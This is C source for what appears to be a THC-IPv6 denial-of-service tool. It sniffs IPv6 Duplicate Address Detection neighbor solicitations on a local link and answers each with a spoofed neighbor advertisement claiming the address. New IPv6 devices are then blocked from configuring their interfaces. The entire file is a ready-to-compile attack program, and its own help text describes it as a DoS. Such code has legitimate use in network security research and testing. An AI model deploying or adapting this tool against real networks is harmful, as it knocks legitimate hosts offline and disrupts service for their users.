#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

unsigned char *pkt = NULL, *dstmac, *dst;
int pkt_len = 0;
thc_ipv6_hdr *ipv6;
int mychecksum;
char *interface;
char *ptr3, *ptr4;
int i;

void help(char *prg) {
  printf("%s %s (c) 2011 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface\n\n", prg);
  printf("This tools prevents new ipv6 interfaces to come up, by sending answers to\n");
  printf("duplicate ip6 checks (DAD). This results in a DOS for new ipv6 devices.\n\n");
  exit(-1);
}

void intercept(u_char * foo, const struct pcap_pkthdr *header, const unsigned char *data) {
  unsigned char *ipv6hdr = (unsigned char *) (data + 14);

  if (debug) {
    printf("DEBUG: packet received\n");
    thc_dump_data((unsigned char *) data, header->caplen, "Received Packet");
  }
  if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_NEIGHBORSOL || header->caplen < 78)
    return;
  if (*(data + 22) + *(data + 23) + *(data + 24) + *(data + 25) + *(data + 34) + *(data + 35) + *(data + 36) + *(data + 37) != 0)
    return;
  if (debug)
    printf("DEBUG: packet is a valid duplicate ip6 check via icmp6 neighbor solitication\n");

  memcpy(ipv6->pkt + 22, data + 62, 16);        // copy target to srcip6
  memcpy(ipv6->pkt + 62, data + 62, 16);        // copy target to target
  mychecksum = checksum_pseudo_header(ipv6->pkt + 22, ipv6->pkt + 38, NXT_ICMP6, ipv6->pkt + 54, 32);
  ipv6->pkt[56] = mychecksum / 256;
  ipv6->pkt[57] = mychecksum % 256;

  thc_send_pkt(interface, pkt, &pkt_len);

  ptr4 = thc_ipv62notation(ipv6->pkt + 22);
  printf("Spoofed packet for existing ip6 as %s\n", ptr4);
  free(ptr4);

  if (fork() == 0) {
    usleep(200);
    debug = 0;
    thc_send_pkt(interface, pkt, &pkt_len);
    exit(0);
  }

  ipv6->pkt[56] = 0;
  ipv6->pkt[57] = 0;
  // new random mac for next duplicate check
  for (i = 2; i < 6; i++)
    ipv6->pkt[6 + i] = rand() % 256;
  memcpy(ipv6->pkt + 80, ipv6->pkt + 6, 6);

  (void) wait3(NULL, WNOHANG, NULL);
  return;
}

int main(int argc, char *argv[]) {
  char dummy[24];
  unsigned char *ownmac;

  if (argc != 2 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (debug)
    printf("Preparing spoofed packet for speed-up\n");
  interface = argv[1];
  ownmac = thc_get_own_mac(interface);
  memset(dummy, 'X', sizeof(dummy));
  dummy[16] = 2;
  dummy[17] = 1;
  memcpy(&dummy[18], ownmac, 6);
  dst = thc_resolve6("ff02::1");
  dstmac = thc_get_multicast_mac(dst);
  if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, dummy, dst, 255, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, ICMP6_NEIGHBORADV_OVERRIDE, dummy, 24, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, ownmac, dstmac, pkt, &pkt_len) < 0)
    return -1;
  ipv6 = (thc_ipv6_hdr *) pkt;
  memset(ipv6->pkt + 56, 0, 2); // reset checksum to zero
  srand(time(NULL) + getpid());
  for (i = 2; i < 6; i++)       // set a random mac, keeping the first two bytes
    ipv6->pkt[6 + i] = rand() % 256;
  memcpy(ipv6->pkt + 80, ipv6->pkt + 6, 6);
  if (debug) {
    thc_dump_data(ipv6->pkt, ipv6->pkt_len, "Prepared spoofing packet");
    printf("\n");
  }

  printf("Started ICMP6 DAD Denial-of-Service (Press Control-C to end) ...\n");
  return thc_pcap_function(interface, "ip6", (char *) intercept, NULL);
}
